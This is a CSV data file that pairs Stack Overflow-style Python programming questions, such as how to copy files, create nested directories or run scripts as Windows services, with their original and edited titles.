originalTitle,body,reformulatedTitle
cx_Oracle - what is the best way to iterate over a result set?, There are several ways to iterate over a result set. What are the tradeoff of each? <code> ,cx_Oracle: How do I iterate over a result set?
What is the best way to iterate over a result set?, There are several ways to iterate over a result set. What are the tradeoff of each? <code> ,cx_Oracle: How do I iterate over a result set?
Adding a Method to an Existing Object," I've read that it is possible to add a method to an existing object (i.e., not in the class definition) in Python. I understand that it's not always good to do so. But how might one do this? <code> ",Adding a Method to an Existing Object Instance
How to sell Python to a client/boss/person with lots of cash," When asked to create system XYZ and you ask to do it in Python over PHP or Ruby, what are the main features you can mention when they require you to explain it? <code> ",How to sell Python to a client/boss/person
Build a Basic Python Iterator, How would one create an iterative function (or iterator object) in python? <code> ,How to build a basic iterator?
How to make class iterable?, How would one create an iterative function (or iterator object) in python? <code> ,How to build a basic iterator?
Build a basic Python iterator, How would one create an iterative function (or iterator object) in python? <code> ,How to build a basic iterator?
A Transpose/Unzip Function in Python," I have a list of 2-item tuples and I'd like to convert them to 2 lists where the first contains the first item in each tuple and the second list holds the second item.For example: Is there a builtin function that does that? <code>  original = [('a', 1), ('b', 2), ('c', 3), ('d', 4)]# and I want to become...result = (['a', 'b', 'c', 'd'], [1, 2, 3, 4])",Transpose/Unzip Function (inverse of zip)?
A Transpose/Unzip Function in Python (inverse of zip)," I have a list of 2-item tuples and I'd like to convert them to 2 lists where the first contains the first item in each tuple and the second list holds the second item.For example: Is there a builtin function that does that? <code>  original = [('a', 1), ('b', 2), ('c', 3), ('d', 4)]# and I want to become...result = (['a', 'b', 'c', 'd'], [1, 2, 3, 4])",Transpose/Unzip Function (inverse of zip)?
How do I download a file over HTTP using Python?," I have a small utility that I use to download an MP3 file from a website on a schedule and then builds/updates a podcast XML file which I've added to iTunes.The text processing that creates/updates the XML file is written in Python. However, I use wget inside a Windows .bat file to download the actual MP3 file. I would prefer to have the entire utility written in Python.I struggled to find a way to actually download the file in Python, thus why I resorted to using wget.So, how do I download the file using Python? <code> ",How to download a file over HTTP?
"How do threads work in python, and what are common python-threading specific pitfalls?"," I've been trying to wrap my head around how threads work in Python, and it's hard to find good information on how they operate. I may just be missing a link or something, but it seems like the official documentation isn't very thorough on the subject, and I haven't been able to find a good write-up.From what I can tell, only one thread can be running at once, and the active thread switches every 10 instructions or so?Where is there a good explanation, or can you provide one? It would also be very nice to be aware of common problems that you run into while using threads with Python. <code> ","How do threads work in Python, and what are common Python-threading specific pitfalls?"
Programmatically editing python source," This is something that I think would be very useful. Basically, I'd like there to be a way to edit Python source programmatically without requiring human intervention. There are a couple of things I would like to do with this:Edit the configuration of Python apps that use source modules for configuration.Set up a ""template"" so that I can customize a Python source file on the fly. This way, I can set up a ""project"" system on an open source app I'm working on and allow certain files to be customized.I could probably write something that can do this myself, but I can see that opening up a lot of ""devil's in the details"" type issues. Are there any ways to do this currently, or am I just going to have to bite the bullet and implement it myself? <code> ",Programmatically editing Python source
Can I run a Python script as a service (in Windows)? How?," I am sketching the architecture for a set of programs that share various interrelated objects stored in a database. I want one of the programs to act as a service which provides a higher level interface for operations on these objects, and the other programs to access the objects through that service.I am currently aiming for Python and the Django framework as the technologies to implement that service with. I'm pretty sure I figure how to daemonize the Python program in Linux. However, it is an optional spec item that the system should support Windows. I have little experience with Windows programming and no experience at all with Windows services.Is it possible to run a Python programs as a Windows service (i. e. run it automatically without user login)? I won't necessarily have to implement this part, but I need a rough idea how it would be done in order to decide whether to design along these lines.Edit: Thanks for all the answers so far, they are quite comprehensive. I would like to know one more thing: How is Windows aware of my service? Can I manage it with the native Windows utilities? What is the equivalent of putting a start/stop script in /etc/init.d? <code> ",How do you run a Python script as a service in Windows?
"Is it possible to run a Python script as a service in Windows? If possible, how?"," I am sketching the architecture for a set of programs that share various interrelated objects stored in a database. I want one of the programs to act as a service which provides a higher level interface for operations on these objects, and the other programs to access the objects through that service.I am currently aiming for Python and the Django framework as the technologies to implement that service with. I'm pretty sure I figure how to daemonize the Python program in Linux. However, it is an optional spec item that the system should support Windows. I have little experience with Windows programming and no experience at all with Windows services.Is it possible to run a Python programs as a Windows service (i. e. run it automatically without user login)? I won't necessarily have to implement this part, but I need a rough idea how it would be done in order to decide whether to design along these lines.Edit: Thanks for all the answers so far, they are quite comprehensive. I would like to know one more thing: How is Windows aware of my service? Can I manage it with the native Windows utilities? What is the equivalent of putting a start/stop script in /etc/init.d? <code> ",How do you run a Python script as a service in Windows?
are python threads broken?, A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether. What can said about this rumor? <code> ,Are Python threads buggy?
Are python threads buggy?, A reliable coder friend told me that Python's current multi-threading implementation is seriously buggy - enough to avoid using altogether. What can said about this rumor? <code> ,Are Python threads buggy?
What's the best way to implement an 'enum' in Python?," I'm mainly a C# developer, but I'm currently working on a project in Python.How can I represent the equivalent of an Enum in Python?  <code> ",How can I represent an 'Enum' in Python?
How can I represent an 'enum' in Python?," I'm mainly a C# developer, but I'm currently working on a project in Python.How can I represent the equivalent of an Enum in Python?  <code> ",How can I represent an 'Enum' in Python?
What's the best way return multiple values from a function in Python?," I have a function where I need to do something to a string. I need the function to return a boolean indicating whether or not the operation succeeded, and I also need to return the modified string. In C#, I would use an out parameter for the string, but there is no equivalent in Python. I'm still very new to Python and the only thing I can think of is to return a tuple with the boolean and modified string.Related question: Is it pythonic for a function to return multiple values? <code> ",What's the best way to return multiple values from a function?
What's the best way to return multiple values from a function in Python?," I have a function where I need to do something to a string. I need the function to return a boolean indicating whether or not the operation succeeded, and I also need to return the modified string. In C#, I would use an out parameter for the string, but there is no equivalent in Python. I'm still very new to Python and the only thing I can think of is to return a tuple with the boolean and modified string.Related question: Is it pythonic for a function to return multiple values? <code> ",What's the best way to return multiple values from a function?
/usr/bin/env portability," At the beginning of all my executable Python scripts I put the shebang line: I'm running these scripts on a system where env python yields a Python 2.2 environment. My scripts quickly fail because I have a manual check for a compatible Python version: I don't want to have to change the shebang line on every executable file, if it's possible; however, I don't have administrative access to the machine to change the result of env python and I don't want to force a particular version, as in: I'd like to avoid this because system may have a newer version than Python 2.4, or may have Python 2.5 but no Python 2.4.What's the elegant solution?[Edit:] I wasn't specific enough in posing the question -- I'd like to let users execute the scripts without manual configuration (e.g. path alteration or symlinking in ~/bin and ensuring your PATH has ~/bin before the Python 2.2 path). Maybe some distribution utility is required to prevent the manual tweaks? <code>  #!/usr/bin/env python if sys.version_info < (2, 4): raise ImportError(""Cannot run with Python version < 2.4"") #!/usr/bin/env python2.4",Python deployment and /usr/bin/env portability
Where can I find the time and memory efficencies of the built-in sequence types in Python," I've been unable to find a source for this information, short of looking through the Python source code myself to determine how the objects work. Does anyone know where I could find this online? <code> ",Where can I find the time and space complexity of the built-in sequence types in Python
How to get an absolute file name in Python?," Given a path such as ""mydir/myfile.txt"", how do I find the file's absolute path relative to the current working directory in Python? E.g. on Windows, I might end up with: <code>  ""C:/example/cwd/mydir/myfile.txt""",How to get an absolute file path in Python
How to get an absolute file path in Python?," Given a path such as ""mydir/myfile.txt"", how do I find the file's absolute path relative to the current working directory in Python? E.g. on Windows, I might end up with: <code>  ""C:/example/cwd/mydir/myfile.txt""",How to get an absolute file path in Python
Replacements for switch statement in python?," I want to write a function in Python that returns different fixed values based on the value of an input index. In other languages I would use a switch or case statement, but Python does not appear to have a switch statement. What are the recommended Python solutions in this scenario? <code> ",Replacements for switch/case statement in Python?
Replacements for switch statement in Python?," I want to write a function in Python that returns different fixed values based on the value of an input index. In other languages I would use a switch or case statement, but Python does not appear to have a switch statement. What are the recommended Python solutions in this scenario? <code> ",Replacements for switch/case statement in Python?
"Why do you need explicitly have the ""self"" argument into a Python method?"," When defining a method on a class in Python, it looks something like this: But in some other languages, such as C#, you have a reference to the object that the method is bound to with the ""this"" keyword without declaring it as an argument in the method prototype. Was this an intentional language design decision in Python or are there some implementation details that require the passing of ""self"" as an argument? <code>  class MyClass(object): def __init__(self, x, y): self.x = x self.y = y","Why do you need explicitly have the ""self"" argument in a Python method?"
Why isn't the 'Len' function inherited by dictionaries and lists in Python," example: Python being (very) object oriented, I don't understand why the 'len' function isn't inherited by the object. Plus I keep trying the wrong solution since it appears as the logical one to me <code>  a_list = [1, 2, 3]a_list.len() # doesn't worklen(a_list) # works",Why isn't the 'len' function inherited by dictionaries and lists in Python
Accessing object memory address," When you call the object.__repr__() method in Python you get something like this back: Is there any way to get a hold of the memory address if you overload __repr__(), other then calling super(Class, obj).__repr__() and regexing it out?  <code>  <__main__.Test object at 0x2aba1c0cf890> ",Accessing Object Memory Address
How do I copy a file in python?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How do I copy a file in Python?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How can a file be copied?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How do I copy a file in Python?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
How to copy a files?, How do I copy a file in Python?I couldn't find anything under osmodule. <code> ,How to copy files?
Iterate a list as tuples in python," I could swear I've seen the function (or method) that takes a list, like this [3, 7, 19] and makes it into iterable list of tuples, like so: [(0,3), (1,7), (2,19)] to use it instead of: but I can't remember the name and googling ""iterate list"" gets nothing. <code>  for i in range(len(name_of_list)): name_of_list[i] = something",Iterate a list with indexes in Python
Iterate a list with indexes in python," I could swear I've seen the function (or method) that takes a list, like this [3, 7, 19] and makes it into iterable list of tuples, like so: [(0,3), (1,7), (2,19)] to use it instead of: but I can't remember the name and googling ""iterate list"" gets nothing. <code>  for i in range(len(name_of_list)): name_of_list[i] = something",Iterate a list with indexes in Python
Python: How to make a cross-module variable?," The __debug__ variable is handy in part because it affects every module. If I want to create another variable that works the same way, how would I do it?The variable (let's be original and call it 'foo') doesn't have to be truly global, in the sense that if I change foo in one module, it is updated in others. I'd be fine if I could set foo before importing other modules and then they would see the same value for it. <code> ",How to make a cross-module variable?
Crypto/x509 certificate parsing libraries for Python (pyOpenSSL vs Python OpenSSL Wrappers vs...)," Any recommended crypto libraries for Python. I know I've asked something similar in x509 certificate parsing libraries for Java, but I should've split the question in two.What I need is the ability to parse X.509 Certificates to extract the information contained in them.Looking around, I've found two options:Python OpenSSL Wrappers (http://sourceforge.net/projects/pow)pyOpenSSLOf the two, pyOpenSSL seems to be the most ""maintained"", but I'd like some feedback on anybody who might have experience with them? <code> ",Crypto/X509 certificate parsing libraries for Python
Hiding a password in a (python) script, I have got a python script which is creating an ODBC connection. The ODBC connection is generated with a connection string. In this connection string I have to include the username and password for this connection. Is there an easy way to obscure this password in the file (just that nobody can read the password when I'm editing the file) ?  <code> ,Hiding a password in a python script (insecure obfuscation only)
Python module dependency problem," Ok I have two modules, each containing a class, the problem is their classes reference each other.Lets say for example I had a room module and a person module containing CRoom and CPerson.The CRoom class contains infomation about the room, and a CPerson list of every one in the room.The CPerson class however sometimes needs to use the CRoom class for the room its in, for example to find the door, or too see who else is in the room.The problem is with the two modules importing each other I just get an import error on which ever is being imported second :(In c++ I could solve this by only including the headers, and since in both cases the classes just have pointers to the other class, a forward declaration would suffice for the header eg: Is there anyway to do this in python, other than placing both classes in the same module or something like that?edit: added python example showing problem using above classeserror: Traceback (most recent call last): File ""C:\Projects\python\test\main.py"", line 1, in from room import CRoom File ""C:\Projects\python\test\room.py"", line 1, in from person import CPerson File ""C:\Projects\python\test\person.py"", line 1, in from room import CRoom ImportError: cannot import name CRoom room.py person.py <code>  class CPerson;//forward declareclass CRoom{ std::set<CPerson*> People; ... from person import CPersonclass CRoom: def __init__(Self): Self.People = {} Self.NextId = 0 def AddPerson(Self, FirstName, SecondName, Gender): Id = Self.NextId Self.NextId += 1# Person = CPerson(FirstName,SecondName,Gender,Id) Self.People[Id] = Person return Person def FindDoorAndLeave(Self, PersonId): del Self.People[PeopleId] from room import CRoomclass CPerson: def __init__(Self, Room, FirstName, SecondName, Gender, Id): Self.Room = Room Self.FirstName = FirstName Self.SecondName = SecondName Self.Gender = Gender Self.Id = Id def Leave(Self): Self.Room.FindDoorAndLeave(Self.Id)",Python module dependency
"What is the difference between Ruby and Python versions of the ""self"" keyword?"," I've done some Python but have just now starting to use RubyI could use a good explanation of the difference between ""self"" in these two languages. Obvious on first glance:Self is not a keyword in Python, but there is a ""self-like"" value no matter what you call it.Python methods receive self as an explicit argument, whereas Ruby does not.Ruby sometimes has methods explicitly defined as part of self using dot notation.Initial Googling revealshttp://rubylearning.com/satishtalim/ruby_self.htmlhttp://www.ibiblio.org/g2swap/byteofpython/read/self.html  <code> ","What is the difference between Ruby and Python versions of""self""?"
Sleeping in a DOS batch file," When writing a batch file to automate something on a Windows box, I've needed to pause its execution for several seconds (usually in a test/wait loop, waiting for a process to start). At the time, the best solution I could find uses ping (I kid you not) to achieve the desired effect. I've found a better write-up of it here, which describes a callable ""wait.bat"", implemented as follows: You can then include calls to wait.bat in your own batch file, passing in the number of seconds to sleep.Apparently the Windows 2003 Resource Kit provides a Unix-like sleep command (at last!). In the meantime, for those of us still using Windows XP, Windows 2000 or (sadly) Windows NT, is there a better way?I modified the sleep.py script in the accepted answer, so that it defaults to one second if no arguments are passed on the command line: <code>  @ping 127.0.0.1 -n 2 -w 1000 > nul@ping 127.0.0.1 -n %1% -w 1000> nul import time, systime.sleep(float(sys.argv[1]) if len(sys.argv) > 1 else 1)",Sleeping in a batch file
Sleeping in a Batch file," When writing a batch file to automate something on a Windows box, I've needed to pause its execution for several seconds (usually in a test/wait loop, waiting for a process to start). At the time, the best solution I could find uses ping (I kid you not) to achieve the desired effect. I've found a better write-up of it here, which describes a callable ""wait.bat"", implemented as follows: You can then include calls to wait.bat in your own batch file, passing in the number of seconds to sleep.Apparently the Windows 2003 Resource Kit provides a Unix-like sleep command (at last!). In the meantime, for those of us still using Windows XP, Windows 2000 or (sadly) Windows NT, is there a better way?I modified the sleep.py script in the accepted answer, so that it defaults to one second if no arguments are passed on the command line: <code>  @ping 127.0.0.1 -n 2 -w 1000 > nul@ping 127.0.0.1 -n %1% -w 1000> nul import time, systime.sleep(float(sys.argv[1]) if len(sys.argv) > 1 else 1)",Sleeping in a batch file
Python 3 performance?," On a question of just performance, how does Python 3 compare to Python 2.x? <code> ",Performance: Python 3.x vs Python 2.x
Python 3.x vs Python 2.x," On a question of just performance, how does Python 3 compare to Python 2.x? <code> ",Performance: Python 3.x vs Python 2.x
Python list named indicies.," In PHP I can name my array indices so that I may have something like: Is this possible in Python? <code>  $shows = Array(0 => Array('id' => 1, 'name' => 'Sesame Street'), 1 => Array('id' => 2, 'name' => 'Dora The Explorer'));",Python: can I have a list with named indices?
What do i need to import to gain access to my models?, I'd like to run a script to populate my database. I'd like to access it through the Django database API.The only problem is that I don't know what I would need to import to gain access to this.How can this be achieved? <code> ,What do I need to import to gain access to my models?
List of ip addresses/hostnames from local network in python," How can I get a list of the IP addresses or host names from a local network easily in Python?It would be best if it was multi-platform, but it needs to work on Mac OS X first, then others follow.Edit: By local I mean all active addresses within a local network, such as 192.168.xxx.xxx.So, if the IP address of my computer (within the local network) is 192.168.1.1, and I have three other connected computers, I would want it to return the IP addresses 192.168.1.2, 192.168.1.3, 192.168.1.4, and possibly their hostnames. <code> ",List of IP addresses/hostnames from local network in Python
How to convert a C string (char *) into a Python string?," I have embedded a Python interpreter in a C program. Suppose the C program reads some bytes from a file into a char array and learns (somehow) that the bytes represent text with a certain encoding (e.g., ISO 8859-1, Windows-1252, or UTF-8). How do I decode the contents of this char array into a Python string?The Python string should in general be of type unicodefor instance, a 0x93 in Windows-1252 encoded input becomes a u'\u0201c'.I have attempted to use PyString_Decode, but it always fails when there are non-ASCII characters in the string. Here is an example that fails: The error message is UnicodeEncodeError: 'ascii' codec can't encode character u'\u201c' in position 0: ordinal not in range(128), which indicates that the ascii encoding is used even though we specify windows_1252 in the call to PyString_Decode.The following code works around the problem by using PyString_FromString to create a Python string of the undecoded bytes, then calling its decode method: <code>  #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *py_string; Py_Initialize(); py_string = PyString_Decode(c_string, 1, ""windows_1252"", ""replace""); if (!py_string) { PyErr_Print(); return 1; } return 0;} #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *raw, *decoded; Py_Initialize(); raw = PyString_FromString(c_string); printf(""Undecoded: ""); PyObject_Print(raw, stdout, 0); printf(""\n""); decoded = PyObject_CallMethod(raw, ""decode"", ""s"", ""windows_1252""); Py_DECREF(raw); printf(""Decoded: ""); PyObject_Print(decoded, stdout, 0); printf(""\n""); return 0;}",How to convert a C string (char array) into a Python string when there are non-ASCII characters in the string?
How to convert a C string (char array) into a Python string?," I have embedded a Python interpreter in a C program. Suppose the C program reads some bytes from a file into a char array and learns (somehow) that the bytes represent text with a certain encoding (e.g., ISO 8859-1, Windows-1252, or UTF-8). How do I decode the contents of this char array into a Python string?The Python string should in general be of type unicodefor instance, a 0x93 in Windows-1252 encoded input becomes a u'\u0201c'.I have attempted to use PyString_Decode, but it always fails when there are non-ASCII characters in the string. Here is an example that fails: The error message is UnicodeEncodeError: 'ascii' codec can't encode character u'\u201c' in position 0: ordinal not in range(128), which indicates that the ascii encoding is used even though we specify windows_1252 in the call to PyString_Decode.The following code works around the problem by using PyString_FromString to create a Python string of the undecoded bytes, then calling its decode method: <code>  #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *py_string; Py_Initialize(); py_string = PyString_Decode(c_string, 1, ""windows_1252"", ""replace""); if (!py_string) { PyErr_Print(); return 1; } return 0;} #include <Python.h>#include <stdio.h>int main(int argc, char *argv[]){ char c_string[] = { (char)0x93, 0 }; PyObject *raw, *decoded; Py_Initialize(); raw = PyString_FromString(c_string); printf(""Undecoded: ""); PyObject_Print(raw, stdout, 0); printf(""\n""); decoded = PyObject_CallMethod(raw, ""decode"", ""s"", ""windows_1252""); Py_DECREF(raw); printf(""Decoded: ""); PyObject_Print(decoded, stdout, 0); printf(""\n""); return 0;}",How to convert a C string (char array) into a Python string when there are non-ASCII characters in the string?
Javascript style field methods unpythonic?," I've started to use constructs like these: Update: based on this thread, I've revised the DictObj implementation to: where DictObj is a dictionary that can be accessed via dot notation: I find it more aesthetically pleasing than d['something']. Note that accessing an undefined key returns None instead of raising an exception, which is also nice.Update: Smashery makes a good point, which mhawke expands on for an easier solution. I'm wondering if there are any undesirable side effects of using dict instead of defining a new dictionary; if not, I like mhawke's solution a lot.AutoEnum is an auto-incrementing Enum, used like this: Both are working well for me, but I'm feeling unpythonic about them. Are these in fact bad constructs? <code>  class DictObj(object): def __init__(self): self.d = {} def __getattr__(self, m): return self.d.get(m, None) def __setattr__(self, m, v): super.__setattr__(self, m, v) class dotdict(dict): def __getattr__(self, attr): return self.get(attr, None) __setattr__= dict.__setitem__ __delattr__= dict.__delitem__class AutoEnum(object): def __init__(self): self.counter = 0 self.d = {} def __getattr__(self, c): if c not in self.d: self.d[c] = self.counter self.counter += 1 return self.d[c] d = DictObj()d.something = 'one' CMD = AutoEnum()cmds = { ""peek"": CMD.PEEK, ""look"": CMD.PEEK, ""help"": CMD.HELP, ""poke"": CMD.POKE, ""modify"": CMD.POKE,}",Javascript style dot notation for dictionary keys unpythonic? 
How to flush output of Python print?, How do I force Python's print function to output to the screen? <code> ,How can I flush the output of the print function (unbuffer python output)?
How to flush output of print function?, How do I force Python's print function to output to the screen? <code> ,How can I flush the output of the print function (unbuffer python output)?
How can I flush the output of the print function?, How do I force Python's print function to output to the screen? <code> ,How can I flush the output of the print function (unbuffer python output)?
Python for large scale developmen," I would be interested to learn about large scale development in Python and especially in how do you maintain a large code base?When you make incompatibility changes to the signature of a method, how do you find all the places where that method is being called. In C++/Java the compiler will find it for you, how do you do it in Python?When you make changes deep inside the code, how do you find out what operations an instance provides, since you don't have a static type to lookup?How do you handle/prevent typing errors (typos)?Are UnitTest's used as a substitute for static type checking?As you can guess I almost only worked with statically typed languages (C++/Java), but I would like to try my hands on Python for larger programs. But I had a very bad experience, a long time ago, with the clipper (dBase) language, which was also dynamically typed. <code> ",How can I use Python for large scale development?
Python for large scale development," I would be interested to learn about large scale development in Python and especially in how do you maintain a large code base?When you make incompatibility changes to the signature of a method, how do you find all the places where that method is being called. In C++/Java the compiler will find it for you, how do you do it in Python?When you make changes deep inside the code, how do you find out what operations an instance provides, since you don't have a static type to lookup?How do you handle/prevent typing errors (typos)?Are UnitTest's used as a substitute for static type checking?As you can guess I almost only worked with statically typed languages (C++/Java), but I would like to try my hands on Python for larger programs. But I had a very bad experience, a long time ago, with the clipper (dBase) language, which was also dynamically typed. <code> ",How can I use Python for large scale development?
How to get file creation & modification date/times in Python?," I have a script that needs to do some stuff based on file creation and modification dates, but it has to run on Linux and Windows.What's the best cross-platform way to get file creation and modification date/times in Python? <code> ",How to get file creation and modification date/times
How to get file creation & modification date/times?," I have a script that needs to do some stuff based on file creation and modification dates, but it has to run on Linux and Windows.What's the best cross-platform way to get file creation and modification date/times in Python? <code> ",How to get file creation and modification date/times
How do I parse a listing of files to get just the filenames in python?, So lets say I'm using Python's ftplib to retrieve a list of log files from an FTP server. How would I parse that list of files to get just the file names (the last column) inside a list? See the link above for example output. <code> ,How do I parse a listing of files to get just the filenames in Python?
Python filter/remove URL's from a list," I have a text file of URLs, about 14000. Below is a couple of examples:http://www.domainname.com/pagename?CONTENT_ITEM_ID=100&param2=123http://www.domainname.com/images?IMAGE_ID=10http://www.domainname.com/pagename?CONTENT_ITEM_ID=101&param2=123http://www.domainname.com/images?IMAGE_ID=11http://www.domainname.com/pagename?CONTENT_ITEM_ID=102&param2=123I have loaded the text file into a Python list and I am trying to get all the URLs with CONTENT_ITEM_ID separated off into a list of their own. What would be the best way to do this in Python?Cheers <code> ",Python filter/remove URLs from a list
Python: Best way to create directory if it doesn't exist for file write?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
Create directory if it doesn't exist for file write," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
check if a directory exists and create it if necessary," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
Check if a directory exists and create it if necessary," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
"In Python, check if a directory exists and create it if necessary"," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How to check if a directory exists and create it if necessary?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I create a directory if it does not exist?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I safely create a nested directory in Python?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I safely create a nested directory?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
How can I safely create a nested directory in Python?," What is the most elegant way to check if the directory a file is going to be written to exists, and if not, create the directory using Python? Here is what I tried: Somehow, I missed os.path.exists (thanks kanja, Blair, and Douglas). This is what I have now: Is there a flag for open(), that makes this happen automatically? <code>  import osfile_path = ""/my/directory/filename.txt""directory = os.path.dirname(file_path)try: os.stat(directory)except: os.mkdir(directory)f = file(filename) def ensure_dir(file_path): directory = os.path.dirname(file_path) if not os.path.exists(directory): os.makedirs(directory)",How can I safely create a nested directory?
Can you acheive a case insensitive 'unique' constraint in Sqlite3 (with Django)?," So let's say I'm using Python 2.5's built-in default sqlite3 and I have a Django model class with the following code: I've got the admin interface setup and everything appears to be working fine except that I can create two SomeEntity records, one with some_field='some value' and one with some_field='Some Value' because the unique constraint on some_field appears to be case sensitive.Is there some way to force sqlite to perform a case insensitive comparison when checking for uniqueness?I can't seem to find an option for this in Django's docs and I'm wondering if there's something that I can do directly to sqlite to get it to behave the way I want. :-) <code>  class SomeEntity(models.Model): some_field = models.CharField(max_length=50, db_index=True, unique=True)",Can you achieve a case insensitive 'unique' constraint in Sqlite3 (with Django)?
python argument binders," How can I bind arguments to a Python method to store a nullary functor for later invocation? Similar to C++'s boost::bind.For example: <code>  def add(x, y): return x + yadd_5 = magic_function(add, 5)assert add_5(3) == 8",Python Argument Binders
Polling the keyboard in python," How can I poll the keyboard from a console python app? Specifically, I would like to do something akin to this in the midst of a lot of other I/O activities (socket selects, serial port access, etc.): What is the correct pythonic way to do this on Windows? Also, portability to Linux wouldn't be bad, though it's not required. <code>  while True: # doing amazing pythonic embedded stuff # ... # periodically do a non-blocking check to see if # we are being told to do something else x = keyboard.read(1000, timeout = 0) if len(x): # ok, some key got pressed # do something",Polling the keyboard (detect a keypress) in python
Use only some parts of django?," I like Django, but for a particular application I would like to use only parts of it, but I'm not familiar enough with how Django works on the inside, so maybe someone can point me into the right direction as to what I have to check out.Specifically, I want to use:The models and database abstractionThe caching API, although I want to avoid database lookups by caching, not HTML generation, and since the caching framework in Django is intended for the latter, I'm not sure yet whether that's really appropriate.I would not use:TemplatingurlconfigsOr, more exactly, I'm neither using HTTP nor HTML. So basically, I have a different input / output chain than usual.Can this work?My personal killer feature in Django is the Object / database mapping that I can do with the models, so if there's another technology (doesn't have to be Python, I'm in the design phase and I'm pretty agnostic about languages and platforms) that gives me the same abilities, that would be great, too. <code> ",Use only some parts of Django?
emacs 23 and iPython, Is there anyone out there using iPython with emacs 23? The documents on the emacs wiki are a bit of a muddle and I would be interested in hearing from anyone using emacs for Python development. Do you use the download python-mode and ipython.el? What do you recommend? <code> ,Emacs 23 and iPython
Django authentication and AJaX - urls that require login," I want to add some Ajax-niceness to my Django-coded website. In my Django code, I use the @login_required decorator from django.contrib.auth.decorators to mark which view requires authentication. The default behavior when a not authenticated user clicks it is to redirect him/her to login page, and then pass the target page. What I saw on some sites, and really liked, is that when user clicks a link leading to a place restricted to logged-only users, instead of getting redirected to a login page, he/she gets a popup window (via JavaScript) asking him/her to log in or register. There's no redirection part, so no need for a user to use the ""back"" key if he/she decides he/she really doesn't like the website enough to waste the time registering.So, the qestion is: how would you manage the task of automatically marking some links as ""restricted"" so JavaScript can handle their onclick event and display a ""please log in"" popup?  <code> ",Django authentication and Ajax - URLs that require login
